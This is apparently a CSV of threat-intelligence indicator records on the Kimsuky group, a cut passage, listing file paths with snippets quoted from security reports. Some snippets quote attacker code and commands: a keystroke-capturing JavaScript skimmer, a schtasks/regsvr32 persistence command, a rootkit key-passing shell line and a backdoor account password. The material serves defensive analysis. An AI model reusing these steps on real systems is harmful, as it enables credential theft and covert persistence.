59.7.91.171 se/quick/L_quick.php?fpath=/home/ssktool/public_ht 2022.06 ~ 2022.08 21*.16*.25*.5* obtained from the Yahoo folder ca",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:8420449499304692d5c4642e0ccff6abbe102a3492dccce1d49c957c429cd5bb,observation--sha256:e11ce0ff6fd32d262eefd747fec11ad66ab8e707ed34700a0e65e8c5b9712cfc,file-path,/proc/acpi/pcicard,/proc/acpi/pcicard,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--030e0bafc14e2552,kimsuky/APTDown/article.txt,"{""line"": 424}",[],[],[],[],0,false,medium,TLP:CLEAR,text-line,combination (see below). The LKM communicates via `/proc/acpi/pcicard` with,Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:8420449499304692d5c4642e0ccff6abbe102a3492dccce1d49c957c429cd5bb,observation--sha256:ecbfb5908b9f2e3567f859b8a2578c61afa7a23dfd18d17dc9fb963026299a3b,file-path,/proc/acpi/pcicard,/proc/acpi/pcicard,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--030e0bafc14e2552,kimsuky/APTDown/article.txt,"{""line"": 446}",[],[],[],[],0,false,medium,TLP:CLEAR,text-line,Creates /proc/acpi/pcicard to communicate with the userland:,Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:8420449499304692d5c4642e0ccff6abbe102a3492dccce1d49c957c429cd5bb,observation--sha256:834bdd0870f41022b71efa342ef119a1e7b30cdc68c2f18fff298f49de97fcac,file-path,/proc/acpi/pcicard,/proc/acpi/pcicard,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--030e0bafc14e2552,kimsuky/APTDown/article.txt,"{""line"": 449}",[],[],[],[],0,false,medium,TLP:CLEAR,text-line,"echo -n ""${DECODEKEY}"" > /proc/acpi/pcicard",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:ece4485c673e155299bfbd6a0715d1fd798e32cbaea89721ea88d9f2292dff24,observation--sha256:79fe6b4f2c4cdb7e20824a2c9a877bb5b646d86f8035c055580f72ed7fdec525,file-path,/tmp/abc,/tmp/abc,candidate,,unknown,unknown,not-stated,2021-10-01T00:00:00Z,source--operation-newton,kimsuky/Operation_Newton_Kimsuky-APPLE(SEED).pdf,"{""page"": 12}","[""activity--operation-newton""]","[""malware--appleseed""]","[""infra--compromised-web-servers""]","[""c2"",""download"",""exfiltration"",""payload""]",1,false,high,TLP:CLEAR,pdf-text,"OPERATION NEWTON: HI KIMSUKY? DID AN APPLE(SEED) REALLY FALL... KIM ET AL. 12 VIRUS BULLETIN CONFERENCE OCTOBER 2021  Taskrun (command): C:\Windows\system32\regsvr32.exe/s""C:\ProgramData\Intel\Driverdriver.cfg""  Schedule type: every 30min 4.2 Command and scripting interpreter On a Linux server, after infiltrating the internal server, the web shell was downloaded from the outside using the CLI command, and execution permission was granted. After downloading the file from the outside through the",
1.0.0,actor--kimsuky,artifact--sha256:bf8dc1589a7ea626062a6a3b622a452bfd3d746fb19b0c141ea546404ef28e86,observation--sha256:e40a243426707b1946916d4b4094926ba3118948548a775a693f51e2923e3c77,file-path,/tmp/abc.e,/tmp/abc.e,candidate,,unknown,unknown,not-stated,2021-10-01T00:00:00Z,source--operation-newton,kimsuky/Operation_Newton_Kimsuky-APPLE(SEED).pdf,"{""page"": 12}","[""activity--operation-newton""]","[""malware--appleseed""]","[""infra--compromised-web-servers""]","[""c2"",""download"",""exfiltration"",""payload""]",1,false,high,TLP:CLEAR,pdf-text,"OPERATION NEWTON: HI KIMSUKY? DID AN APPLE(SEED) REALLY FALL... KIM ET AL. 12 VIRUS BULLETIN CONFERENCE OCTOBER 2021  Taskrun (command): C:\Windows\system32\regsvr32.exe/s""C:\ProgramData\Intel\Driverdriver.cfg""  Schedule type: every 30min 4.2 Command and scripting interpreter On a Linux server, after infiltrating the internal server, the web shell was downloaded from the outside using the CLI command, and execution permission was granted. After downloading the file from the outside through the",
1.0.0,actor--kimsuky,artifact--sha256:e3c12ee61cd8d6e2be99ae624c92495e649fad26c12627472410ce58863d6f70,observation--sha256:b49e34059924a05a512d954f905926e8092734ab9003ddc50a97449cf6c6eba5,file-path,C:\ mounted (hgfs). Dumped included.,C:\ mounted (hgfs). Dumped included,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--030e0bafc14e2552,kimsuky/APTDown/article.txt,"{""line"": 134}",[],[],[],[],0,false,medium,TLP:CLEAR,text-line,The guest VM had the host's C:\ mounted (hgfs). Dumped included.,Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:b68f52f7ec057480d40bec6089b8dc05c1834421d5b8ed1a5f7cdcd9bdc5f482,observation--sha256:d44d6d6a60e16055c6bc7b8bc29a9d606e0ea88cd92bed59dee421132888a9bd,file-path,C:\ProgramData\Intel\,C:\ProgramData\Intel\,candidate,,unknown,unknown,not-stated,2021-10-01T00:00:00Z,source--operation-newton,kimsuky/Operation_Newton_Kimsuky-APPLE(SEED).pdf,"{""page"": 15}","[""activity--operation-newton""]","[""malware--appleseed""]","[""infra--compromised-web-servers""]","[""c2"",""download"",""exfiltration"",""payload""]",1,false,high,TLP:CLEAR,pdf-text,"OPERATION NEWTON: HI KIMSUKY? DID AN APPLE(SEED) REALLY FALL... KIM ET AL. 15VIRUS BULLETIN CONFERENCE OCTOBER 2021  Mutex name - windows update server real time mui cache - windows update {2020-1050-01-01-0001-I}  Scheduler - schtasks/create/f/tn""Intel\Disk\Volume1""/tr""C:\Windows\system32\regsvr32.exe/s""C:\ProgramData\Intel\ Driverdriver.cfg""""/sc minute /mo30  The path to the file is finally downloaded and executed - %APPDATA%\Roaming\Intel\DriverSoftware\Microsoft\Windows\Defender  C&C add",
1.0.0,actor--kimsuky,artifact--sha256:37d0167ca707806e442c76edfc5c2b1c42b95265d373aa944fe3a3902df22389,observation--sha256:de5a1ae8fd3eb1c13352b9efcb2a10fa4fc69e644973996fac7c042715f03b49,file-path,C:\ProgramData\Intel\Driverdriver.cfg,C:\ProgramData\Intel\Driverdriver.cfg,candidate,,unknown,unknown,not-stated,2021-10-01T00:00:00Z,source--operation-newton,kimsuky/Operation_Newton_Kimsuky-APPLE(SEED).pdf,"{""page"": 11}","[""activity--operation-newton""]","[""malware--appleseed""]","[""infra--compromised-web-servers""]","[""c2"",""download"",""exfiltration"",""payload""]",1,false,high,TLP:CLEAR,pdf-text,"OPERATION NEWTON: HI KIMSUKY? DID AN APPLE(SEED) REALLY FALL... KIM ET AL. 11VIRUS BULLETIN CONFERENCE OCTOBER 2021 Stage 02: bootstrap.js?_=[BASE64(ID)]&token=[BASE64(Target)]=&m=login (Web page newly moved by iframe.) <script> </script><scripttype=""text/javascript""> $(function(){ functionsend(value=""""){ $.ajax({ url:""ga.js"", type:""post"", data:{ _:""[BASE64(ID)]"", token:btoa(value) } }); } $(""input"").keydown(function(evt) { send(""keydown:""+evt.target.value); }); $(""input"").change(function(evt) {",
1.0.0,actor--kimsuky,artifact--sha256:37d0167ca707806e442c76edfc5c2b1c42b95265d373aa944fe3a3902df22389,observation--sha256:f2e39fb7b8a48e46f7f7940d22f789a007f5a9b726e2b194ea58e1eb7b7cc36b,file-path,C:\ProgramData\Intel\Driverdriver.cfg,C:\ProgramData\Intel\Driverdriver.cfg,candidate,,unknown,unknown,not-stated,2021-10-01T00:00:00Z,source--operation-newton,kimsuky/Operation_Newton_Kimsuky-APPLE(SEED).pdf,"{""page"": 12}","[""activity--operation-newton""]","[""malware--appleseed""]","[""infra--compromised-web-servers""]","[""c2"",""download"",""exfiltration"",""payload""]",1,false,high,TLP:CLEAR,pdf-text,"OPERATION NEWTON: HI KIMSUKY? DID AN APPLE(SEED) REALLY FALL... KIM ET AL. 12 VIRUS BULLETIN CONFERENCE OCTOBER 2021  Taskrun (command): C:\Windows\system32\regsvr32.exe/s""C:\ProgramData\Intel\Driverdriver.cfg""  Schedule type: every 30min 4.2 Command and scripting interpreter On a Linux server, after infiltrating the internal server, the web shell was downloaded from the outside using the CLI command, and execution permission was granted. After downloading the file from the outside through the",
1.0.0,actor--kimsuky,artifact--sha256:0e4605e36b793ea9c36cc11ef33ea1441875b6a859f9a9d5a92e598a2069b5cb,observation--sha256:02d7787b50a35e26a23915379e63cb5e9b625dac7c074473a269730fa9b18619,file-path,C:\ProgramData\Intel\Driverdriver.cfg (b1cad7fa7d7168fd3b8ff853d266b669),C:\ProgramData\Intel\Driverdriver.cfg (b1cad7fa7d7168fd3b8ff853d266b669,candidate,,unknown,unknown,not-stated,2021-10-01T00:00:00Z,source--operation-newton,kimsuky/Operation_Newton_Kimsuky-APPLE(SEED).pdf,"{""page"": 15}","[""activity--operation-newton""]","[""malware--appleseed""]","[""infra--compromised-web-servers""]","[""c2"",""download"",""exfiltration"",""payload""]",1,false,high,TLP:CLEAR,pdf-text,"OPERATION NEWTON: HI KIMSUKY? DID AN APPLE(SEED) REALLY FALL... KIM ET AL. 15VIRUS BULLETIN CONFERENCE OCTOBER 2021  Mutex name - windows update server real time mui cache - windows update {2020-1050-01-01-0001-I}  Scheduler - schtasks/create/f/tn""Intel\Disk\Volume1""/tr""C:\Windows\system32\regsvr32.exe/s""C:\ProgramData\Intel\ Driverdriver.cfg""""/sc minute /mo30  The path to the file is finally downloaded and executed - %APPDATA%\Roaming\Intel\DriverSoftware\Microsoft\Windows\Defender  C&C add",
1.0.0,actor--kimsuky,artifact--sha256:b919ea7286c46a4fc51937241fb8a9e7201871f04de2f53d8d002c38f72fc5a2,observation--sha256:b33b95c7d18ba5735379d356fbbd05ca228cb195f0a13ee727aa1fa7695a2cdc,file-path,C:\ProgramData\Microsoft\Windows\Start,C:\ProgramData\Microsoft\Windows\Start,candidate,2023-07-29T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 29}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Below (Table 8) is an excerpt of only the logs related to BlackBit ransomware among the logs collected from the system hacked by the Kimsuky organization. It summarizes five reasons for determining that the organization intentionally executed BlackBit ransomware. (KR) initial diagnosis 2023-07-29 29 AhnLab's antivirus V3 has the “Use behavior-based diagnosis and Use ransomware security folder” option to respond to ransomware , and using this option can minimize damage caused by ransomware infect",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:b919ea7286c46a4fc51937241fb8a9e7201871f04de2f53d8d002c38f72fc5a2,observation--sha256:d90dc3b062885036dbf6da5e3e716f6ad1fb1c36a1dcb07b24302a56be78d871,file-path,C:\ProgramData\Microsoft\Windows\Start,C:\ProgramData\Microsoft\Windows\Start,candidate,2023-07-24T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 30}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"C:\Windows\winlogon.exe 22*.10*.1*.6* It was determined that the Kimsuky organization intentionally stored it in Tools for malicious purposes. z\x32\mimilove.exe %SystemDrive%\users\%ASD%\downloads\tools\x86.exe C:\Users\Administrator\Desktop\tools\Tools\tools\svchost.exe \Start Menu\Programs\Startup\winlogon.exe Second, the word Tools is commonly found in the diagnostic file path of BlackBit ransomware, shown in light red. C:\Users\Administrator\AppData\Roaming\winlogon.exe Operation Covert Sta",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:a489b1bfb0677c829d3eff0d9cadfef3b9d2dcdc93cca03a01b0a9a823d91954,observation--sha256:c97c693afd8466e91a6a31f15ca85aec678b4832e3e47434774cc7ef3c1612b9,file-path,C:\ProgramData\Software\Microsoft\Windows\Defender\AutoUpdate.dll,C:\ProgramData\Software\Microsoft\Windows\Defender\AutoUpdate.dll,candidate,,unknown,unknown,not-stated,2021-10-01T00:00:00Z,source--operation-newton,kimsuky/Operation_Newton_Kimsuky-APPLE(SEED).pdf,"{""page"": 18}","[""activity--operation-newton""]","[""malware--appleseed""]","[""infra--compromised-web-servers""]","[""c2"",""download"",""exfiltration"",""payload""]",1,false,high,TLP:CLEAR,pdf-text,"OPERATION NEWTON: HI KIMSUKY? DID AN APPLE(SEED) REALLY FALL... KIM ET AL. 18 VIRUS BULLETIN CONFERENCE OCTOBER 2021 In the case of sending and receiving mail internally, due to the fact that the internal mail didn’t go through a separate security solution, executable malware could be distributed. V3 Update_3.5.1.exe (Dropper): 686e3874b772c806e0809fcb933b50ff C:\ProgramData\Software\Microsoft\Windows\Defender\AutoUpdate.dll (AppleSeed):46c4c19a61e034e7b35e70c459f5692f dropper-regsvr32(x86).dll(",
1.0.0,actor--kimsuky,artifact--sha256:259fc4cf9259a13c403d7cb1c357dc1984314daf9d4f44eaee25dd2407125313,observation--sha256:ad4f7abb6d0ce7dbe6fca71b6f7ff02ac19775fc8bc640a364b61048c851b24b,file-path,C:\ProgramData\winlogon.exe,C:\ProgramData\winlogon.exe,candidate,2023-07-29T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 29}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Below (Table 8) is an excerpt of only the logs related to BlackBit ransomware among the logs collected from the system hacked by the Kimsuky organization. It summarizes five reasons for determining that the organization intentionally executed BlackBit ransomware. (KR) initial diagnosis 2023-07-29 29 AhnLab's antivirus V3 has the “Use behavior-based diagnosis and Use ransomware security folder” option to respond to ransomware , and using this option can minimize damage caused by ransomware infect",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:259fc4cf9259a13c403d7cb1c357dc1984314daf9d4f44eaee25dd2407125313,observation--sha256:b262ffc4d9f0617dc44ac520539fc5b76f43e159a6ca6a8e82806bf51a787ec6,file-path,C:\ProgramData\winlogon.exe,C:\ProgramData\winlogon.exe,candidate,2023-07-24T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 30}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"C:\Windows\winlogon.exe 22*.10*.1*.6* It was determined that the Kimsuky organization intentionally stored it in Tools for malicious purposes. z\x32\mimilove.exe %SystemDrive%\users\%ASD%\downloads\tools\x86.exe C:\Users\Administrator\Desktop\tools\Tools\tools\svchost.exe \Start Menu\Programs\Startup\winlogon.exe Second, the word Tools is commonly found in the diagnostic file path of BlackBit ransomware, shown in light red. C:\Users\Administrator\AppData\Roaming\winlogon.exe Operation Covert Sta",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:d1af7d1a852398b1cd454e39490dd02b5612b3cb0f0b227d8facbed67c06c222,observation--sha256:d46711b414092a80edd2302bbd0781553081aa143eab399b5942b5a9aadb5d40,file-path,C:\Users\,C:\Users\,candidate,2021-07-01T00:00:00Z,month,inferred,report-observation-window,2021-07-01T00:00:00Z,source--kgh-2021,kimsuky/Kimsuky-KGH.pdf,"{""page"": 6}",[],"[""malware--kgh""]","[""infra--compromised-web-servers""]","[""c2"",""payload""]",0,false,high,TLP:CLEAR,pdf-text,"微步在线科技有限公司 | www.threatbook.cn | 400-030-1051 图[5] . 向系统目录拷贝 如果复制成功将会直接执行，否则会检查 speed3.exe 路径是否包含 Low 字符串，如果 不包含，则会复制到 C:\Users\<user>\AppData\Local\comhost.exe 执行，并以字符串""Level Medium-->Path""作为日志标识。 如 果 包 含 Low 字 符 串 ， 则 会 利 用 漏 洞 CVE_2019_0880 进 行 提 权 ， 将%Temp%\speed1.dll 通过注入的方式以高权限执行。 图[6] . 漏洞 CVE_2019_0880 expolit 反汇编代码片段 被 注 入 执 行 的 speed1.dll ， 从 Temp 目 录 寻 找 %Temp%\low\pay.exe 或 者 %Temp%\pay.exe （ 间 谍 模 块 ） ， 将 其 复 制 到 C:\Users\<user>\AppData\Local\comhost.exe 并执行。",
1.0.0,actor--kimsuky,artifact--sha256:a0a19df5d72da9fb8a516d72537c00b824e57baae2ef1b4f275163a902e6f1f0,observation--sha256:e65b7efbe4e3fc60593401332971506b99fa16492ae905f0ad403611d6b04f6a,file-path,C:\Users\Administrator\AppData\Local\Temp\OneNot,C:\Users\Administrator\AppData\Local\Temp\OneNot,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 79}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"(Figure 61) Example of files created in the Check folder Trojan/VBS.Kimsuky Trojan/VBS.Akdoor.S2202 Below (Table 46) is the diagnosis made by the antivirus installed by the Kimsuky organization when testing malware in 17*.11*.22*.18*(US). C:\Users\DefaultUser\Downloads\info_sc_org1 - 20230321053830 C:\Users\Administrator\Downloads\passwod.txt.lnk e\16.0\Exported\{015223D7-1E1C-4B92-9ED7- Even if you enter an incorrect parameter value, the file is not deleted. Like list.php, it is determined by t",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:6a9ceded71d49a0c8724212d9f534744f76b9ef9e0325eae777a4f758e2d6756,observation--sha256:8aa57fed54e87acfdb244b25dec8f3fce11efdd57a22de443be5a22cba26e714,file-path,C:\Users\Administrator\AppData\Roaming\Microsoft\Windows,C:\Users\Administrator\AppData\Roaming\Microsoft\Windows,candidate,2023-07-24T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 30}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"C:\Windows\winlogon.exe 22*.10*.1*.6* It was determined that the Kimsuky organization intentionally stored it in Tools for malicious purposes. z\x32\mimilove.exe %SystemDrive%\users\%ASD%\downloads\tools\x86.exe C:\Users\Administrator\Desktop\tools\Tools\tools\svchost.exe \Start Menu\Programs\Startup\winlogon.exe Second, the word Tools is commonly found in the diagnostic file path of BlackBit ransomware, shown in light red. C:\Users\Administrator\AppData\Roaming\winlogon.exe Operation Covert Sta",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:3782c199f572c12bc53f53a1c1fcb5a03cd5158c3fc58bd7657a2990ed6785de,observation--sha256:285047b486c18a3e51985cba123cbd230a3d42b31193dc49f506bbb0679f5efd,file-path,C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start,C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start,candidate,2023-07-29T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 29}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Below (Table 8) is an excerpt of only the logs related to BlackBit ransomware among the logs collected from the system hacked by the Kimsuky organization. It summarizes five reasons for determining that the organization intentionally executed BlackBit ransomware. (KR) initial diagnosis 2023-07-29 29 AhnLab's antivirus V3 has the “Use behavior-based diagnosis and Use ransomware security folder” option to respond to ransomware , and using this option can minimize damage caused by ransomware infect",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:428447f9b754b36b1da50ae6022e3fa859f4328232330755c01cdc9430b68698,observation--sha256:f98b74ead4286b7097eb3f53a07c70494dc9b347a14fdfe7560c2baea5fda615,file-path,C:\Users\Administrator\AppData\Roaming\winlogon.exe,C:\Users\Administrator\AppData\Roaming\winlogon.exe,candidate,2023-07-29T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 29}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Below (Table 8) is an excerpt of only the logs related to BlackBit ransomware among the logs collected from the system hacked by the Kimsuky organization. It summarizes five reasons for determining that the organization intentionally executed BlackBit ransomware. (KR) initial diagnosis 2023-07-29 29 AhnLab's antivirus V3 has the “Use behavior-based diagnosis and Use ransomware security folder” option to respond to ransomware , and using this option can minimize damage caused by ransomware infect",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:428447f9b754b36b1da50ae6022e3fa859f4328232330755c01cdc9430b68698,observation--sha256:419364a76ab3cc4971adabcc871f7e854e4d3d783e4356096a04bb7928f02d3e,file-path,C:\Users\Administrator\AppData\Roaming\winlogon.exe,C:\Users\Administrator\AppData\Roaming\winlogon.exe,candidate,2023-07-24T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 30}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"C:\Windows\winlogon.exe 22*.10*.1*.6* It was determined that the Kimsuky organization intentionally stored it in Tools for malicious purposes. z\x32\mimilove.exe %SystemDrive%\users\%ASD%\downloads\tools\x86.exe C:\Users\Administrator\Desktop\tools\Tools\tools\svchost.exe \Start Menu\Programs\Startup\winlogon.exe Second, the word Tools is commonly found in the diagnostic file path of BlackBit ransomware, shown in light red. C:\Users\Administrator\AppData\Roaming\winlogon.exe Operation Covert Sta",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:4cceedb83c9c772cde1322b014f34d30cf2c2c0d64209fb85736d23901aa22a4,observation--sha256:6ac50c575f65440699b4e401b6f4cab4602a90a8e066276da0df1eee15ae65bc,file-path,C:\Users\Administrator\Desktop\Proxy  Collection\tools\svchost.exe,C:\Users\Administrator\Desktop\Proxy Collection\tools\svchost.exe,candidate,2023-07-24T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 30}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"C:\Windows\winlogon.exe 22*.10*.1*.6* It was determined that the Kimsuky organization intentionally stored it in Tools for malicious purposes. z\x32\mimilove.exe %SystemDrive%\users\%ASD%\downloads\tools\x86.exe C:\Users\Administrator\Desktop\tools\Tools\tools\svchost.exe \Start Menu\Programs\Startup\winlogon.exe Second, the word Tools is commonly found in the diagnostic file path of BlackBit ransomware, shown in light red. C:\Users\Administrator\AppData\Roaming\winlogon.exe Operation Covert Sta",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:9d9133518fe97d6562786a58a9610380d37c2eca6b6e9628c1caeb044dc577a2,observation--sha256:83fd787e717a7c81412cccc1ed45c0033705229e9d790c91fbd2a99f6bee8ab6,file-path,C:\Users\Administrator\Desktop\tools\Tools\tools\svchost.exe,C:\Users\Administrator\Desktop\tools\Tools\tools\svchost.exe,candidate,2023-07-24T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 30}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"C:\Windows\winlogon.exe 22*.10*.1*.6* It was determined that the Kimsuky organization intentionally stored it in Tools for malicious purposes. z\x32\mimilove.exe %SystemDrive%\users\%ASD%\downloads\tools\x86.exe C:\Users\Administrator\Desktop\tools\Tools\tools\svchost.exe \Start Menu\Programs\Startup\winlogon.exe Second, the word Tools is commonly found in the diagnostic file path of BlackBit ransomware, shown in light red. C:\Users\Administrator\AppData\Roaming\winlogon.exe Operation Covert Sta",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:3b913e6cc0248db5494ec8487bb57ac8dc16da9c8995962ff547e5b042edefb5,observation--sha256:9b773881005e59cfa77626de31eecdd945e877b74ed2304a3e0c616b827eecc2,file-path,C:\Users\Administrator\Downloads\exection\ms_x64.dll,C:\Users\Administrator\Downloads\exection\ms_x64.dll,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 80}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"(Table 46) Antivirus diagnostic log of 17*.11*.22*.18*(US) hxxps://asec.ahnlab.com/ko/49843/ First, the word 'exection' in the FILE PATH of ms_x64.dll, shown in light red, is a typo that originally meant execution, and the Kimsuky organization has established the continuity of the connection with 17*.11*.22*.18*(US). To secure it, it can be interpreted as running ms_x64.dll to create an account (DefaultUser / lsjdoif#@$@#09v921) and creating and running %System%\termsvc.dll, which is RDPWraper. ",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:6afebac6087d9cc5b1272a09caa514986aa39c73289960bb84c7aa6d4eb678f6,observation--sha256:b73b4035f76b06b4601f03ee729804dcca3408d44c32cbfdea67ce0f807f8e36,file-path,C:\Users\Administrator\Downloads\passwod.txt.lnk,C:\Users\Administrator\Downloads\passwod.txt.lnk,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 79}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"(Figure 61) Example of files created in the Check folder Trojan/VBS.Kimsuky Trojan/VBS.Akdoor.S2202 Below (Table 46) is the diagnosis made by the antivirus installed by the Kimsuky organization when testing malware in 17*.11*.22*.18*(US). C:\Users\DefaultUser\Downloads\info_sc_org1 - 20230321053830 C:\Users\Administrator\Downloads\passwod.txt.lnk e\16.0\Exported\{015223D7-1E1C-4B92-9ED7- Even if you enter an incorrect parameter value, the file is not deleted. Like list.php, it is determined by t",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:80fb2524b41cfd7e79e900b01f15bfa3979c8ef4d8a04ad1e026beddd3a57879,observation--sha256:c9f62f7e6a669e83dde77312700d6e6b5745f72707befa2fa9651bdeeef267d7,file-path,C:\Users\Administrator\Downloads\result.txt.lnk,C:\Users\Administrator\Downloads\result.txt.lnk,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 80}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"(Table 46) Antivirus diagnostic log of 17*.11*.22*.18*(US) hxxps://asec.ahnlab.com/ko/49843/ First, the word 'exection' in the FILE PATH of ms_x64.dll, shown in light red, is a typo that originally meant execution, and the Kimsuky organization has established the continuity of the connection with 17*.11*.22*.18*(US). To secure it, it can be interpreted as running ms_x64.dll to create an account (DefaultUser / lsjdoif#@$@#09v921) and creating and running %System%\termsvc.dll, which is RDPWraper. ",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:e3dbc74347ce66b1f04aa66adc8e6ef0f96c2541229e494cca3d1878913f7338,observation--sha256:6c504a8a77441dcfcec6afa6571b002dbeb6cbd5543fb6f951a49e54d1932598,file-path,C:\Users\DarkHorse\Documents\Visual Studio2015\Projects\empty\x64\Release\empty.pdb[표4-1] nhgames.zipPDB경로,C:\Users\DarkHorse\Documents\Visual Studio2015\Projects\empty\x64\Release\empty.pdb[표4-1] nhgames.zipPDB경로,candidate,,unknown,unknown,not-stated,2023-10-16T00:00:00Z,source--darkhorse-2023,kimsuky/20231016_threat_inteligence_report_DarkHorse.pdf,"{""page"": 33}","[""activity--darkhorse""]",[],"[""infra--lookalike-domains""]","[""c2"",""payload"",""phishing""]",1,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport ○추가로, 해당유형의CHM공격C2서버에서“nhgames.zip” 라는이름의ZIP파일로위장한실행파일이배포된정황을확인했습니다. ○해당파일에대한분석을진행했지만, 의심스러운악성행위는발견되지않았으며, 공격자가제작중인테스트파일로추정하고있습니다. 또한, 공격자가“DarkHorse” 라는사용자이름을사용하는사실을확인할수있었고이번보고서의OperationName 으로명명하게됐습니다. PDB C:\Users\DarkHorse\Documents\Visual Studio2015\Projects\empty\x64\Release\empty.pdb[표4-1] nhgames.zipPDB경로 [그림4-6] nhgames.zip파일 Genians SecurityCenter 32",
1.0.0,actor--kimsuky,artifact--sha256:148419e95373c2614610ade71f9bce8f896f715c64f56013e91157ed9ec930e9,observation--sha256:25d9f8c783135c5269262d343d0c2e611a62564d42f3a506328433beadf18b0b,file-path,C:\Users\DefaultUser\Downloads\3\RdpScan_L  a_1226.exe,C:\Users\DefaultUser\Downloads\3\RdpScan_L a_1226.exe,candidate,2023-04-13T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 53}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"53 hxxps://listmember.info/tygygvftsfx8g6 8Gu8x7s78gsx6519.php HackTool/Win.RdpScan.R437610 Second, 27.255.***.***, where the webshell URL is mapped, is the IP assigned to this host and is an IP band frequently used by the Kimsuky organization when building C2. 27.255.80.170(KR) hxxps://a1ive.info/tygygvftsfx8g68Gu8 x7s78gsx6.php 2023-04-13 3 4 I used it. In the table below (Table 24), excluding webshell URLs 14 and 15, three patterns can be found in webshell URLs 1 to 13. C:\Users\DefaultUser\D",Actor-directory corpus sweep; ambiguous values remain candidates.
